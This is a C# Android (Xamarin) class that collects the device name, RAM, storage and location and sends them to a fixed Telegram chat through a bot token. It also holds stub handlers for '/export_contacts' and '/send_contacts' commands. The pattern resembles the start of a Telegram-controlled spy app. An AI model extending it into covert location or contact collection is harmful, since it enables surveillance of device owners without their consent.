using Android.App;
using Android.Content;
using Android.OS;
using Android.Widget;
using System.Threading.Tasks;
namespace TelegramBot
{
    public class BotActivityModel
    {
        private readonly ITelegramApiService _apiService;
        private readonly string _botToken = BotSettings.BotToken;
        private readonly long _chatId = BotSettings.ChatId;
        public BotActivityModel(ITelegramApiService apiService)
        {
            _apiService = apiService;
        }

        public async Task SendDeviceInfoAsync()
        {
            string deviceName = DeviceInfoHelper.GetDeviceName();
            string totalRAM = DeviceInfoHelper.GetTotalRAM();
            string totalStorage = DeviceInfoHelper.GetTotalStorage();
            string location = await DeviceInfoHelper.GetLocationAsync();  // Fetch location

            string message = $"Device Info:\n" +
                             $"Device Name: {deviceName}\n" +
                             $"Total RAM: {totalRAM}\n" +
                             $"Total Storage (ROM): {totalStorage}\n" +
                             $"Location:\n{location}";

            await SendMessageAsync(message);
        }

        private async Task SendMessageAsync(string message)
        {
            try
            {
                var response = await _apiService.SendMessageAsync(_botToken, _chatId, message);
                if (response.Ok)
                {
                    // Success message sent
                    Toast.MakeText(Application.Context, "Device info sent successfully", ToastLength.Short).Show();
                }
                else
                {
                    // Error handling
                    Toast.MakeText(Application.Context, "Error: " + response.Description, ToastLength.Short).Show();
                }
            }
            catch (Exception ex)
            {
                Toast.MakeText(Application.Context, "Error: " + ex.Message, ToastLength.Short).Show();
            }
        }

        public async Task HandleCommandAsync(string command)
        {
            if (command == "/export_contacts")
            {
                await SendMessageAsync("export command.");
            }
            else if (command == "/send_contacts")
            {
                await SendMessageAsync("send command.");
            }
            else
            {
                await SendMessageAsync("Invalid command.");
            }
        }
    }
}
